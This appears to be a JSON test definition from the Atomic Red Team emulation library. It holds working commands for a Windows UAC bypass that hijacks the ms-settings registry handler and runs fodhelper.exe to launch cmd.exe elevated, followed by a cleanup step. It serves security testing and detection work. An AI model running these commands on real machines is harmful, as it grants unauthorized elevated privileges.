{
  "id": "58f641ea-12e3-499a-b684-44dee46bd182",
  "name": "Bypass UAC using Fodhelper",
  "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "6188dc17-1ba8-4b20-977e-240a662768a1",
      "type": "execute-command",
      "data": {
        "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "c8339edd-82ad-416a-971e-91fe30d9d324",
      "type": "execute-command",
      "data": {
        "command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "6188dc17-1ba8-4b20-977e-240a662768a1",
      "p": "on-success",
      "o": "c8339edd-82ad-416a-971e-91fe30d9d324"
    },
    {
      "s": "6188dc17-1ba8-4b20-977e-240a662768a1",
      "p": "on-failure",
      "o": "c8339edd-82ad-416a-971e-91fe30d9d324"
    }
  ],
  "tags": [
    "T1548.002",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "executable_binary",
      "type": "path",
      "description": "Binary to execute with UAC Bypass",
      "value": "C:\\Windows\\System32\\cmd.exe"
    }
  ]
}